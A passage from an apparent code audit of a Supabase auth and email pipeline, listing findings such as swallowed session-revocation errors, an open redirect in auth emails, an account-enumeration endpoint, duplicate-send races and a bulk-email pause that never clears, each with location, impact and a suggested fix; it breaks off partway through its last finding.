### [High] revoke-user-sessions returns success:true even when the revocation insert or GoTrue signOut fails  `error-handling` (CONFIRMED)
- **Where:** revoke-user-sessions/index.ts:63-71 (admin.from('revoked_sessions').insert and admin.auth.admin.signOut both awaited, neither error inspected; success:true returned unconditionally). target_user_id validated only as optional string (BodySchema:9-12).
- **What breaks:** This is the admin tool for killing a compromised user's sessions. target_user_id is only an optional string, so a malformed/non-UUID id makes the insert fail — silently — and signOut fail — silently — while the admin sees {success:true}. During active compromise response the admin believes the attacker was evicted; nothing happened. (And per the client-side-only enforcement finding, even a successful insert wouldn't kill the live access token.)
- **Smallest fix:** Validate target_user_id as a UUID; check both operation errors and return 500 if either fails; report success only when the source-of-truth row is confirmed written.

### [High] Synthetic auth-prober omits the broker-required correlationId, so every stage fails on every run — permanent false paging  `under-engineering` (CONFIRMED)
- **Where:** auth-prober/index.ts:86-126 sends bodies {email}, {email,password}, {} with correlationId only in the x-correlation-id HEADER (callBroker:59). Broker reads correlationId from the JSON body; CORR_ID = z.string().min(8) is required on sign-in/reset/sign-out (schemas.ts:42,97,142) → safeParse fails → 400 code 'unexpected' (auth-broker/index.ts:134-143,338-346,515-525).
- **What breaks:** The broker rejects every prober request because correlationId is absent from the body. reset_request, sign_in AND sign_out all return ok:false on all three active stages every 5-minute run. The two-strike debounce (index.ts:175-192) then always finds a prior same-stage err and pages into agent_fix_queue continuously (until the hourly cap). Permanent alert fatigue trains admins to ignore the one monitor meant to catch real auth outages — and it can never observe a real one because it never gets past validation.
- **Smallest fix:** Send correlationId in the request body to match the broker contract; add a contract test validating the prober payload against the broker's own zod schemas.

### [High] finalize-password-reset swallows a failed revocation insert and still returns 200 ok — password changed, other sessions left alive  `error-handling` (CONFIRMED)
- **Where:** finalize-password-reset/index.ts:97-120 (revocationRecorded = !insertError; signOut('others') fire-and-forget with .catch(()=>undefined); returns {ok:true, other_devices_revoked:revocationRecorded} regardless).
- **What breaks:** If the revoked_sessions insert fails, the password has ALREADY been updated (line 91) but the function returns HTTP 200 ok:true with other_devices_revoked:false — a flag the SPA almost certainly ignores. The security-critical half of the workflow (evict every other session after a reset) silently no-ops while the user is told the reset succeeded. An attacker who triggered the reset keeps their session. The admin.signOut('others') is also .catch-swallowed, so a GoTrue failure there is invisible too.
- **Smallest fix:** If the revocation insert fails, fail the request (or retry) rather than returning ok:true; surface other_devices_revoked=false as an error the caller must handle.
- _added-in-verification_

### [High] Two divergent password-reset-complete implementations: one evicts other sessions, one does not  `boundary` (CONFIRMED)
- **Where:** auth-broker/index.ts:468-490 (only clears login rate limit; NO revoked_sessions insert, NO signOut of others) vs finalize-password-reset/index.ts:97-107 (inserts revoked_sessions + admin.signOut(userId,'others')).
- **What breaks:** The same security-critical workflow — change password + evict other sessions — is implemented twice with different guarantees. A reset completed through the auth-broker path leaves every other session alive (broker does neither the revoke-row write nor any signOut). Which path runs depends on which the SPA happens to call: a silent, environment-dependent security posture.
- **Smallest fix:** Collapse to one reset-complete owner that always records the revocation and signs out other sessions; delete the weaker broker duplicate.

### [Medium] auth-prober sign-out stage authenticates with the anon key and treats any 200 as success — cannot detect a broken sign-out  `under-engineering` (PLAUSIBLE)
- **Where:** auth-prober/index.ts:119-126 (sign-out called with only Bearer anonKey, outcome = signOut.json.ok || signOut.status===200); broker handleSignOut with anon token resolves no user yet returns 200 (auth-broker/index.ts:534-556).
- **What breaks:** The probe never signs in to obtain a real session token — it calls sign-out with the anon key. Even once the correlationId bug above is fixed, the broker finds no user, does nothing meaningful, and returns 200; the probe reads 200 as success. So the sign-out stage validates nothing: a genuinely broken sign-out / revocation path is invisible to the monitor that claims to cover it. (Note: the first pass called this a 'hard-coded green'; in current code it actually errs, because the missing correlationId makes it 400 — the durable defect is that it uses anonKey and can't assert real revocation.)
- **Smallest fix:** Have the probe sign in, capture the real session token, sign out with it, then assert is_session_revoked / a follow-up authenticated call now fails.

### [Medium] revoked_sessions has five uncoordinated writers with no single owner and divergent revoke_before rules  `ownership` (CONFIRMED)
- **Where:** Writers: finalize-password-reset/index.ts:99-104 (revoke_before=tokenIssuedAt), sign-out-all-devices/index.ts:84-91 (keepCurrent?tokenIssuedAt:null), revoke-user-sessions/index.ts:63-67 (no revoke_before), admin-sign-out-all-users/index.ts:55-64 (no revoke_before), plus the browser client (auth-broker/index.ts:537-540 comment: 'revoked_sessions row write is handled by client').
- **What breaks:** The declared source of truth for revocation is written by four edge functions AND the SPA, each hand-constructing the row (reason/revoked_by/revoke_before) with different rules. The broker sign-out delegates the write to the client, so if the client is offline/crashes the revocation never lands at all. No one place enforces the invariant, so revocations are silently lost or inconsistent across paths.
- **Smallest fix:** Route every revocation through one owning RPC/service that constructs and validates the row; forbid the client from writing revoked_sessions directly.

### [Medium] Admin role check is done two different ways across sibling admin functions  `boundary` (CONFIRMED)
- **Where:** has_role() RPC: admin-purge-auth-user/index.ts:66-70, admin-sign-out-all-users/index.ts:36-40, _shared/request-auth.ts:69-72. Direct table read: revoke-user-sessions/index.ts:42-45 (admin.from('user_roles').select('role').eq('role','admin')).
- **What breaks:** Most admin endpoints authorize via the has_role() security-definer RPC; revoke-user-sessions instead reads user_roles directly. Two mechanisms for the same authorization fact means any change to role semantics (soft-deleted roles, expiry, org scoping) must be remembered in two places, and the ad-hoc table read will silently diverge — over- or under-authorizing a security-critical session-revocation endpoint.
- **Smallest fix:** Use requireAdminRequest / has_role() everywhere; delete the ad-hoc user_roles table read.

### [Medium] check-account-identity is a public account-existence oracle, contradicting the broker's anti-enumeration identity/check  `security` (CONFIRMED)
- **Where:** check-account-identity/index.ts:158-198 (profiles→user_id→getUserById→returns real has_password/has_google booleans; verify_jwt=false; captcha best-effort 101-126 falls through on absent/invalid token; only defense is 10/min per hashed email|ip).
- **What breaks:** auth-broker/identity/check returns a constant shape and never reveals existence (index.ts:600-629). check-account-identity does the opposite: has_password/has_google are true only for real accounts (false/false covers non-existent, rate-limited AND error cases), so any true value positively confirms an account and its providers. Captcha is best-effort — an absent or stale token just falls through (117-125) — leaving only a per-(email|ip) rate limit that IP rotation defeats. Two functions in the same stack take opposite stances on the same privacy guarantee.
- **Smallest fix:** Require a verified captcha (fail closed), apply a global/stricter limit, and reconcile with the anti-enumeration policy — or fold this into the privacy-preserving broker endpoint.

### [Medium] check-account-identity resolves accounts by profiles.email — a mirror of the auth.users-owned email that can silently drift  `ownership` (CONFIRMED)
- **Where:** check-account-identity/index.ts:154-171 (comment explicitly switched away from the auth admin email filter to select user_id from profiles where email=...).
- **What breaks:** auth.users owns the email fact; profiles.email is a copy. This lookup trusts the copy. If a user changes email through GoTrue and the profiles mirror lags or fails, the identity check — which drives password-reset UX and 'use Google' hints — returns wrong/empty results and sends users into dead-end recovery flows. Exactly the 'two copies disagree' failure the arch rules warn about.
- **Smallest fix:** Resolve identity from the auth-owned record (admin getUserByEmail) rather than the profiles mirror, or guarantee the mirror updates in the same transaction as the GoTrue email change.

### [Medium] Open redirect in non-recovery auth emails — verify link's redirect_to is not origin-validated  `security` (PLAUSIBLE)
- **Where:** auth-email-hook/index.ts:167-192 (recovery restricted to ALLOWED_RESET_ORIGINS:64-67,171; signup/magiclink/invite/email_change fall through to /auth/v1/verify?...&redirect_to=fallbackRedirect with fallbackRedirect = payload redirect_to verbatim, line 168,191).
- **What breaks:** Only the recovery template restricts the redirect origin. For every other auth email the GoTrue verify URL is built with redirect_to copied straight from the hook payload (ultimately client-influenced emailRedirectTo). A crafted signup/magic-link with an attacker origin yields a legitimately-signed Tech Fleet auth email whose button verifies the token then redirects to an attacker page — phishing from a trusted domain, plus possible post-verify context leakage. Exploitability is bounded by GoTrue's own redirect allow-list config, hence PLAUSIBLE, but the code adds no defense and is inconsistent with recovery.
- **Smallest fix:** Apply the ALLOWED origin allow-list (or GoTrue's configured redirect list) to ALL email types, not just recovery.

### [Medium] auth-email-hook dedup is check-then-act (TOCTOU) with no unique constraint — concurrent GoTrue retries double-send  `error-handling` (CONFIRMED)
- **Where:** auth-email-hook/index.ts:266-279 (SELECT recent email_send_log within 60s; if none, enqueue at 306-337) with no locking or unique/idempotency key on that lookback. idempotencyKey=messageId is randomly generated per invocation (263), so it does not dedup retries.
- **What breaks:** GoTrue retries the Send Email hook on slow responses. Two concurrent invocations both run the 60s look-back SELECT, both see zero rows, and both enqueue — the user gets duplicate confirmation/recovery emails, and a recovery double-send means two live-looking links, user confusion, and support load. The dedup only protects sequential, well-separated retries.
- **Smallest fix:** Enforce dedup at the database with a unique/idempotency key (recipient+template+window) and upsert, not a racy SELECT-then-INSERT.

### [Medium] In-memory per-isolate rate limiters are ineffective at scale and leak memory unboundedly  `under-engineering` (CONFIRMED)
- **Where:** send-magic-link/index.ts:35,44-54 (ipBuckets Map, keys never deleted), record-auth-recovery/index.ts:56-67 (ipHits, never deleted), record-auth-wedge/index.ts:34-45 (ipHits, never deleted).
- **What breaks:** (1) The Maps live in one Deno isolate; Supabase runs many and recycles them, so the 3/hr magic-link and 60/30-per-hr beacon caps are per-isolate — an attacker spread across isolates sends far more (send-magic-link even admits 'isolate-local but good enough'), enabling magic-link email-bombing of a victim inbox. (2) None of these Maps evict stale keys, so a long-lived isolate under IP-varied traffic grows the Map until OOM kills the isolate mid-request.
- **Smallest fix:** Use the DB-backed check_rate_limit RPC (already used by check-account-identity) for a shared limit; if any in-memory cache remains, evict expired keys.

### [Medium] admin-sign-out-all-users does hundreds of sequential GoTrue signOut round-trips (and one 100k-row insert) inside one request — times out mid-incident  `under-engineering` (CONFIRMED)
- **Where:** admin-sign-out-all-users/index.ts:45-70 (loads up to 100 pages x 1000 users, single revoked_sessions insert of the whole array at 61-64, then a sequential for-loop calling admin.auth.admin.signOut per user at 67-70).
- **What breaks:** Emergency global sign-out — a break-glass tool — iterates every user with a blocking network call each. At 767 users that is hundreds of serialized round-trips; the function approaches its wall-clock limit and can die after inserting revocation rows but only partially completing GoTrue invalidation. The single insert of up to 100k rows can itself exceed payload limits and fail the whole op with a 500 before any signOut runs. The admin gets an opaque failure during a live incident and cannot tell how far it got.
- **Smallest fix:** Batch the insert and parallelize signOut with bounded concurrency, or rely on the revoked_sessions rows (once server-enforced) and drop the per-user loop; return explicit partial-progress.

### [Low] auth-broker classifier maps unknown 400/422 GoTrue errors into invalid_credentials/weak_password, corrupting outage telemetry  `error-handling` (CONFIRMED)
- **Where:** auth-broker/index.ts:59-71 (status 400 → invalid_credentials, 422 → weak_password, message-substring fallbacks) feeding emitOpsEvent kind at 164-171.
- **What breaks:** Any GoTrue 400 (malformed upstream, config issue) is reported and logged as invalid_credentials; any 422 becomes weak_password. During a real upstream auth incident the ops_events stream (for the calls that do land) fills with invalid_credentials/weak_password noise instead of a service-error signal, so dashboards and the soak runbook misread an outage as user error and nobody pages.
- **Smallest fix:** Only map codes/statuses positively identified; default unknown 4xx/5xx to a distinct service_error code + severity so real incidents surface.

### [Low] admin-purge-auth-user clears email-keyed protection rows and rate limits BEFORE confirming the auth delete  `error-handling` (CONFIRMED)
- **Where:** admin-purge-auth-user/index.ts:151-181 (delete suppressed_emails/failed_login_attempts/email_unsubscribe_tokens and rate_limits, THEN admin.auth.admin.deleteUser which may 500 at 175-178).
- **What breaks:** The function wipes suppression, failed-login, unsubscribe and rate-limit rows for the email, then tries to delete the auth user. If the auth delete fails (500), the account still exists but its abuse-protection rows have already been cleared — briefly weakening protections for an email whose account is still active. Ordering assumes the auth delete always succeeds.
- **Smallest fix:** Delete the auth user first (the failure-prone step); clear email-keyed protection rows only after it succeeds.

### [Low] Public telemetry endpoints leak raw database error messages to unauthenticated callers  `security` (CONFIRMED)
- **Where:** record-auth-wedge/index.ts:113-118 and 155-160 (return error.message in a 500 body to any caller; verify_jwt=false).
- **What breaks:** On a DB error these public endpoints echo the PostgREST/Postgres error.message straight back to the anonymous caller, disclosing internal table/column names, constraint names, or RLS hints useful for schema mapping.
- **Smallest fix:** Return a generic error string publicly; log the detailed error server-side only.

### [Low] record-auth-recovery and record-auth-wedge are annotated // @edge-auth but are fully public  `other` (CONFIRMED)
- **Where:** record-auth-recovery/index.ts:1 (// @edge-auth, body comment 'Public-by-design', no token check); record-auth-wedge/index.ts:1 (// @edge-auth, 'Public-by-design (no JWT)'); config.toml:138,152 verify_jwt=false. Contrast record-auth-event/index.ts:1 which correctly says // @edge-public.
- **What breaks:** The @edge-auth annotation claims these require authentication; the code and config make them anonymous service-role writers. Any governance/lint gate or reviewer trusting the annotations believes these are protected when they are open, hiding the spoofable-telemetry exposure from audits.
- **Smallest fix:** Correct the annotations to @edge-public so the security posture is truthfully labeled and gate-checkable.

---

## Edge: Email pipeline (part 1/2 — dispatch & health)

### [High] bulk_paused auto-set true on rate breach but NEVER auto-cleared — one bounce spike silences bulk email forever  `ownership` (CONFIRMED)
- **Where:** refresh-email-health/index.ts:88-92 (sets bulk_paused=true only in the `shouldPause && !wasPaused` branch; no branch anywhere sets it false); bump-email-warmup/index.ts:44-48 (returns early while paused)
- **What breaks:** Verified: refresh-email-health has exactly one write to bulk_paused (line 91, `update({bulk_paused:true})`). There is no false-write anywhere in the subsystem. compute_email_domain_health over a rolling 7-day window trips shouldPause (complaint>0.1% or bounce>2%), the row is auto-paused, and it stays paused indefinitely once rates recover — no hysteresis, no owner for un-pausing. bump-email-warmup short-circuits at line 44 so the warmup cap never advances while paused. A single transient bounce/complaint spike permanently disables all bulk sends (announcements, blasts, digests) until a human hand-edits email_send_state.
- **Smallest fix:** Add an auto-resume branch in refresh-email-health: when wasPaused && rates below a clear-threshold (with hysteresis) for a sustained window, set bulk_paused=false and alert on the transition. Give bulk_paused one owner that both pauses and resumes.

### [High] Two ungated dispatch pipelines drain two separate stores — the v2 bitmask gate is dead code, enabling double-processing  `ownership` (CONFIRMED)
- **Where:** email-dispatcher/index.ts:26-29 (calls dispatchDue() with no lane/flag check); _shared/email/application/dispatch-due.ts:13-17 (claimDue + send unconditionally); _shared/email/composition.ts:44-52 (isV2Enabled defined but never imported/called by the dispatcher); process-email-queue/index.ts:245+ (legacy pgmq drainer runs in parallel); _shared/email/enqueue-legacy-compat.ts:34-53 (replay forwards legacy payloads into email_outbox)
- **What breaks:** Verified: the header comment (email-dispatcher lines 2-5) claims parallel run 'until pipeline_v2_lanes_bitmask = 7', but dispatchDue() reads no bitmask — it calls outbox.claimDue(max) and sends every claimed row regardless of per-lane flag. isV2Enabled exists in composition.ts:45 but has zero callers in the dispatch path. Simultaneously process-email-queue drains pgmq, and both replay functions call enqueueLegacyPayloadV2 which inserts into email_outbox via enqueue_email_v2. So a message can live in pgmq (drained by process-email-queue) and in email_outbox (drained by email-dispatcher) with no single owner of 'what gets sent'. Operators holding/flipping the bitmask have no effect on the dispatcher. Blast radius: duplicate member emails, unpredictable cutover.
- **Smallest fix:** Either make email-dispatcher honor pipeline_v2_lanes_bitmask per lane (call isV2Enabled and skip un-gated lanes), or complete cutover and delete process-email-queue. Never run both drainers over overlapping message sets.

### [High] Duplicate-send guard is a check-then-act race under a 30s pgmq visibility timeout that batches routinely exceed  `error-handling` (CONFIRMED)
- **Where:** process-email-queue/index.ts:283-287 (read_email_batch vt:30), 373-415 (SELECT email_send_log status='sent' then send), 511-512 & 727-728 (in-loop setTimeout delays), 274 (sendDelay = base × 2^min(consec,4))
- **What breaks:** Verified: vt is hard-coded 30 (line 286). The dup guard at 374-382 does a SELECT for a status='sent' row, then sends at 523 — classic check-then-act. Line 373's own comment names the 'VT expired race'. A batch of up to 10 sends with the 500ms global gap (line 512), per-send DB round-trips, and adaptive backoff (line 274, up to base×16) can exceed 30s; when VT expires mid-batch an overlapping cron tick re-reads the same messages, both isolates see no sent row, both call sendLovableEmail → member emailed twice. Only backstop is provider idempotency_key, which the v2/Resend path applies differently. At 767 users with frequent crons this fires in normal operation.
- **Smallest fix:** Make claim+send atomic at the DB layer (single-row pending→sending transition guarded by WHERE, or a unique partial index on message_id for terminal sent) so a second isolate cannot re-send. Do not rely on a SELECT before send.

### [High] replay-email-dlq infinitely re-processes a payload that fails to re-enqueue — no generation bump, no escalation, silent  `error-handling` (CONFIRMED)
- **Where:** replay-email-dlq/index.ts:106-115 (nextPayload builds gen+1 in-memory, reEnqueue THEN archiveDelete) and 113-114 (empty catch → stats.failed++)
- **What breaks:** Verified: reEnqueue (line 110) runs before archiveDelete (line 111), and the replay_generation increment lives only inside nextPayload (line 108) which is passed to reEnqueue. If enqueue_email_v2 rejects the payload (malformed legacy shape, constraint error), enqueueLegacyPayloadV2 throws (compat helper line 52), the per-message catch swallows it with only stats.failed++ (line 114), archiveDelete is never reached, and the gen bump was never persisted. Every 5 minutes forever the cron re-reads the same archive row, re-fails, and never escalates (escalation only at gen>=3, unreachable). Empty catch = no log line. A handful of poison rows loop indefinitely.
- **Smallest fix:** Persist replay_generation on the archive row BEFORE re-enqueue (or same transaction), log the caught error, and add a hard-failure counter that escalates a row that cannot be re-enqueued instead of looping.

### [High] replay-dlq-emails marks recipients 'already_delivered' using ANY sent 'announcement' row — cross-announcement false positive drops real emails  `other` (CONFIRMED)
- **Where:** replay-dlq-emails/index.ts:337-348 (sentByEmail keyed by recipient across all status='sent' rows for template_name) and 373-377 (if sentAt >= cand.created_at → skip already_delivered)
- **What breaks:** Verified: template_name is the literal 'announcement' for EVERY announcement (enqueue at line 426, probe list, etc.), not per-announcement. sentByEmail (343-348) stores max created_at of any sent 'announcement' row per recipient. At 374 replay is skipped if that max sentAt >= the DLQ row's created_at. So a member who successfully received announcement A last Tuesday is judged 'already_delivered' for announcement B sitting in the DLQ from Monday, because A's sent row is newer than B's dlq row. The member silently never receives B. Real data loss, and it worsens over time as each successful announcement adds a newer sent row.
- **Smallest fix:** Scope the already-delivered check to the specific source id: parse announcement_id from message_id (parseMessageId already exists) and compare against the sent row's message_id / metadata.announcement_id, not the shared template_name.

### [High] Auto-pause fires on tiny denominators — a few complaints during warm-up permanently pause bulk  `other` (CONFIRMED)
- **Where:** refresh-email-health/index.ts:74-77 (shouldPause = complaintRate>0.001 || bounceRate>0.02, no minimum-volume guard; row.sent is available at line 66/115 but unused in the gate)
- **What breaks:** Verified: the pause decision (lines 76-77) uses only the rates; row.sent is read and even printed in the alert (line 115) but never gates the threshold. During warm-up the bulk cap starts at 50/hr (bump-email-warmup line 54), so 7-day volume is a few hundred. 1 complaint in 200 (0.5%) or 3 in 500 blows past the 0.1% complaint threshold and trips a pause that — per finding #1 — never auto-clears. Small-sample noise is indistinguishable from a real reputation problem; a couple stray complaints take bulk offline indefinitely.
- **Smallest fix:** Gate shouldPause on a minimum denominator (require row.sent >= N before rate thresholds apply, and/or a Wilson lower bound) so low-volume noise cannot trigger a pause.

### [High] v2 dispatcher never checks bulk_paused — the auto-pause circuit breaker is bypassed entirely on the v2 outbox path  `ownership` (PLAUSIBLE)
- **Where:** _shared/email/application/dispatch-due.ts:13-17 (claimDue + send, no pause check); _shared/email/infrastructure/pg-policy-repo.ts:8-30 (policy.load reads email_policy_config, NOT email_send_state.bulk_paused); email-dispatcher/index.ts:26-29; vs process-email-queue/index.ts:269 & 426 which DO honor bulk_paused
- **What breaks:** Verified in code: bulk_paused lives in email_send_state and is enforced only by the legacy process-email-queue (lines 269, 426). The v2 dispatchDue path never reads it — policy.load() (pg-policy-repo) selects from a DIFFERENT table (email_policy_config, line 12) and returns no pause field, and dispatch-due.ts claims/sends every row from claim_due_emails with zero lane or pause gating. So refresh-email-health setting bulk_paused=true (the complaint/bounce circuit breaker) does NOT stop bulk email that flows through email_outbox — including everything the replay functions forward there via enqueueLegacyPayloadV2, plus any migrated bulk sender. During the parallel-run cutover the deliverability kill-switch is silently half-effective. PLAUSIBLE only because bulk_paused enforcement could in principle live inside the claim_due_emails SQL (not visible here); the edge/application layer plainly does not check it, and the split-table policy strongly suggests it is not enforced.
- **Smallest fix:** Read bulk_paused (email_send_state) in dispatchDue or claim_due_emails and skip the bulk lane when paused, so the auto-pause breaker covers both pipelines. Verify claim_due_emails' SQL for the pause filter and, if absent, add it.
- _added-in-verification_

### [Medium] DLQ is not terminal — replay-email-dlq auto-re-enqueues TTL/max-retry failures up to 3× more, defeating the retry cap  `boundary` (CONFIRMED)
- **Where:** process-email-queue/index.ts:357 & 363-370 (moveToDlq on TTL / MAX_RETRIES=5) then replay-email-dlq/index.ts:99-112 (auto re-enqueue every archive row up to MAX_REPLAY_GENERATION=3)
- **What breaks:** Verified: process-email-queue moves to DLQ precisely because a message exhausted 5 send failures (line 363) or expired TTL (line 350) — a deliberate stop. replay-email-dlq then indiscriminately re-enqueues every pgmq archive row up to 3 generations every 5 minutes (no filter on failure reason, lines 93-112). A genuinely undeliverable message (bad address, persistent 500) that already failed 5× gets 3 more full send cycles, tripling provider load and audit/error noise for a message correctly given up on. No discrimination between 'transient outage — worth replaying' and 'permanent failure — leave dead'.
- **Smallest fix:** Only auto-replay archive rows whose failure reason is transient (provider-outage window); exclude TTL-expired / max-retry-exhausted / 403 rows from automatic replay.

### [Medium] Four of ten cron functions bypass the shared timing-safe service-role auth helper, using raw string comparison  `security` (CONFIRMED)
- **Where:** email-octopus-sync/index.ts:29 (authHeader !== `Bearer ${serviceKey}`); refresh-email-health/index.ts:27; bump-email-warmup/index.ts:25; email-pipeline-health/index.ts:49 (token !== serviceRoleKey) — vs _shared/service-role-auth.ts:20-28 timingSafeEqualStr used by dispatcher (line 19), process-email-queue (124), replay-email-dlq (69)
- **What breaks:** Verified: service-role-auth.ts exists (its header cites audit C1, 2026-08) specifically so every cron worker shares one constant-time comparator with key-format support. Four functions ignore it and do a plain `!==` on the bearer: (a) non-constant-time comparison of the service-role key (timing side-channel — low but real), and (b) drift — a future key-format change or fix in the shared helper silently does not cover these four. This is the 'two ways to do one thing' the repo rules forbid, in the auth path.
- **Smallest fix:** Replace the raw `!==` checks in these four functions with authorizeServiceRoleRequest(req) so all ten cron workers share one validated, constant-time auth path.

### [Medium] Audit-pressure extrapolation throttles audit logging during the incident that produces the writes — self-suppression loop  `other` (CONFIRMED)
- **Where:** email-pipeline-health/index.ts:144-153 (projected24h = writes5m*12*24 → audit_pressure) written to system_health_state.metadata (170); _shared/audit.ts:46-53 pressureMul + 83-102 shouldEmit cuts caps to 0.1× on 'hard'
- **What breaks:** Verified: a 5-minute audit-write count is linearly extrapolated to 24h (line 150) and classified hard at >=50000 (151). audit.ts refreshPolicy reads that pressure (line 70-72) and pressureMul returns 0.1 on hard (line 48); shouldEmit multiplies each event's cap by it (line 85). So exactly when something is going wrong and generating the most audit events, per-event caps drop to 10% and events — including errors — start being dropped, blinding operators mid-incident. The 5-min control input and the throttle it drives form a feedback loop that hides the incident it measures.
- **Smallest fix:** Allowlist high-severity/security event types past pressureMul (see the added-in-verification finding — the promised skip does not exist), and base pressure on a smoothed longer window, not a 5-min linear projection.

### [Medium] process-email-queue reads its entire config with .single() and no id filter, silently falling back to all-defaults — disables pause/caps/cooldowns  `error-handling` (CONFIRMED)
- **Where:** process-email-queue/index.ts:137-142 (`.from('email_send_state').select(...).single()` — no `.eq('id',1)`, only `data: state` destructured so the error is discarded)
- **What breaks:** Verified: the query at 138-142 has no id filter and does not capture the error. If email_send_state ever has 0 or >1 rows (or is transiently unreadable), .single() yields null data and the code proceeds with every default: bulkPaused=false (line 193), cooldowns null, caps/TTLs at code defaults. An active operator pause (bulk_paused=true) is then IGNORED and bulk resumes during a deliverability incident; per-lane cooldowns vanish. refresh-email-health and bump-email-warmup correctly assume id=1 (they filter/limit), so a second or renumbered row is silently catastrophic here.
- **Smallest fix:** Filter `.eq('id',1)`, check the returned error, and fail closed (treat unknown state as paused / abort) instead of defaulting to send-everything.

### [Medium] Unsubscribe-token insert failure is fully swallowed — enqueues an email whose one-click unsubscribe is dead, driving spam complaints  `error-handling` (CONFIRMED)
- **Where:** replay-dlq-emails/index.ts:412-421 (`.insert({email,token}).then(()=>{}, ()=>{})`) then 437-451 enqueues with unsubscribe_token regardless
- **What breaks:** Verified: the insert into email_unsubscribe_tokens uses a two-arg .then whose rejection handler is `() => {}` (line 420) — it swallows ALL errors, not just a unique-violation. The comment intends to ignore only duplicates, but any real failure (constraint, transient DB error) is silent, and the email is still enqueued at 437 carrying unsubscribeToken (line 447). If the token row was never persisted, the RFC 8058 one-click unsubscribe endpoint cannot resolve the token → recipient cannot unsubscribe → marks it spam → damages the exact sender reputation this subsystem protects, invisibly (no log).
- **Smallest fix:** Catch only the unique-violation code; on any other error, skip enqueuing that recipient (or fail the batch) and log it — never send an email whose unsubscribe token was not persisted.

### [Medium] refresh-email-health alerts 'auto-paused' while the pause never persists (state row missing/renumbered)  `error-handling` (CONFIRMED)
- **Where:** refresh-email-health/index.ts:79-84 (reads state `.eq('id',1).maybeSingle()`; wasPaused=false if absent) then 89-92 (`.update({bulk_paused:true}).eq('id',1)` — return value/error unchecked) then 95-125 (notify_admins + Discord fire unconditionally)
- **What breaks:** Verified: if the state row is absent or not id=1, currentState is null so wasPaused=false (line 84), the shouldPause && !wasPaused branch runs, the UPDATE ... WHERE id=1 affects 0 rows silently (result destructured to nothing, lines 89-92), yet notify_admins (96) and the Discord webhook (108) still announce an auto-pause. Operators are told bulk is paused; it is not. Bulk keeps sending into a complaint/bounce storm while everyone believes it stopped, compounding reputation damage.
- **Smallest fix:** Check the update's affected-row count / error; send the 'paused' alerts only after confirming the write persisted, and alert differently if the state row is missing.

### [Medium] replay-dlq-emails does N+1 announcement fetches + per-recipient inserts/enqueues over up to 2000 rows in one edge invocation — times out mid-replay with no audit  `under-engineering` (CONFIRMED)
- **Where:** replay-dlq-emails/index.ts:281-288 (.limit(2000)), 366-459 (loop: per-candidate announcements SELECT at 391 + per-candidate token insert 412 + log insert 423 + enqueue RPC 437), 462-478 (audit written only AFTER the loop)
- **What breaks:** Verified: candidates come from a 2000-row limit (288), deduped by recipient (317). The replay loop issues, per candidate, a sequential announcements SELECT (391), an unsubscribe-token insert (412), an email_send_log insert (423), and an enqueue_email_v2 RPC (437) — ~4 round-trips × up to 2000, synchronously, in one edge function bound by wall-clock limits. It will time out partway. Because write_audit_log is after the loop (462), a timeout records no audit row at all — the admin has no record of which recipients were replayed, and a re-run re-selects the still-'dlq' originals, duplicating work.
- **Smallest fix:** Batch-load announcements by id set once, cap candidates per invocation and paginate across runs, and write incremental/partial audit as replays happen rather than only at the end.

### [Medium] spf-sync self-heal (edge rebuild + MV refresh) is non-transactional and swallowed — reproduces the exact 'graph returns nothing' failure it claims to fix  `error-handling` (CONFIRMED)
- **Where:** spf-sync/index.ts:236-255 (spf_rebuild_edges in try/catch→warn at 240-244; fw_refresh_neighbors_mv and fw_refresh_search_mv in empty catches at 247-249, 252-254) after spf_apply_dataset DELETE+INSERT at 204
- **What breaks:** Verified: the comment (lines 230-235) states spf_apply_dataset does DELETE+INSERT which reassigns every row id and orphans framework_edges/search MV against old ids — 'the audit's #1 finding'. The self-heal rebuilds edges and refreshes MVs, but spf_rebuild_edges failure is caught and only warned (line 241), and both MV refreshes are empty catches. If spf_rebuild_edges throws, the graph is left orphaned exactly as before, the run still returns 200 (okCount === results.length at 266), and nothing alerts — silent retrieval outage (framework graph/search returns empty). The swap and rebuild are separate RPCs with no spanning transaction, so a concurrent reader between them sees the orphaned state.
- **Smallest fix:** Perform swap+edge-rebuild+MV-refresh in one DB transaction (or a single RPC); if the rebuild fails, report a failed sync (non-200 + audit) instead of swallowing — a swap without a rebuild is a broken state, not a warning.

### [Medium] email-octopus sync poison row loops forever when settle (record_eo_sync_result) fails — never increments attempts, never DLQs  `error-handling` (CONFIRMED)
- **Where:** email-octopus-sync/sync-core.ts:59-72 (push then settle inside try; any throw → row isolated, reaper returns it to pending); index.ts:65-74 (settle throws on record_eo_sync_result RPC error); 75 (onError only console.errors)
- **What breaks:** Verified: attempts/DLQ progression lives entirely inside record_eo_sync_result (settle). In runSyncCycle, push (line 61) runs before settle (62); a settle throw is caught at 67, stats.errors++, row left 'syncing' for the reaper to reset to pending — attempts NOT incremented. But pushDesiredState already hit EmailOctopus. So if settle itself fails (RPC bug, transient DB error at that step), the contact is re-pushed to EO every run indefinitely, never advancing toward DLQ, with only a console.error (index.ts:75). A single row with a broken settle path becomes a permanent EO-write loop.
- **Smallest fix:** Separate 'push failed' from 'settle failed'; on repeated settle failure, increment an attempt counter out-of-band and escalate/DLQ the row rather than relying solely on settle to make progress.

### [Medium] email-pipeline-health does a read-modify-write on system_health_state.metadata — lost-update race clobbers concurrent writers  `ownership` (CONFIRMED)
- **Where:** email-pipeline-health/index.ts:156-170 (SELECT metadata → JS spread-merge → UPDATE), while _shared/audit.ts:60-63 reads the same metadata.audit_pressure key
- **What breaks:** Verified: metadata is fetched (156-160), merged in JS with spread (163-169), and written back non-atomically (170). If any other writer updates system_health_state.metadata between this read and write, that writer's key is silently overwritten with the stale value this function read — the exact opposite of the 'without clobbering other keys' comment (155). audit_pressure (which drives audit throttling and is itself written here) or another subsystem's health key can be lost, producing incorrect throttling or health state.
- **Smallest fix:** Update the single key server-side via jsonb_set in an RPC (atomic) instead of read-merge-write in the edge function.

### [Medium] process-email-queue moveToDlq writes the 'dlq' log row + audit BEFORE archiving — if move_to_dlq fails the message stays live and re-DLQs every tick  `error-handling` (CONFIRMED)
- **Where:** process-email-queue/index.ts:80-96 (insert email_send_log 'dlq' + write_audit_log) THEN 97-105 (move_to_dlq RPC whose error is only console.error'd at 103-105; outer loop continues)
